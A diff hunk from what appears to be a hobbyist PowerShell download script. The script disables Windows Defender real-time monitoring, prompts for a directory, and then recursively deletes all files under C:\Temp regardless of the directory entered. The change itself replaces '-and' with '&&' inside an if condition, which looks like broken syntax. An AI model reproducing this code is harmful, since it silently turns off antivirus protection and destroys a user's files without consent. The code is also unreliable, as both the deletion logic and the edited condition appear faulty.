@@ -19,7 +19,7 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 Write-Host "Disabled Windows Antivirus"
 $directory = Read-Host -Prompt 'Input the directory you would want it to download in: '
 
-if (Test-Path -Path $directory -and $directory -notmatch "C:\\Windows\\(System32|System)") {
+if (Test-Path -Path $directory && $directory -notmatch "C:\\Windows\\(System32|System)") {
    Get-ChildItem -Path C:\Temp -Include *.* -File -Recurse | foreach { $_.Delete()}
 } else {
    Write-Host "Dude wtf why do you want to install in the system32 folder where the important stuff is?"
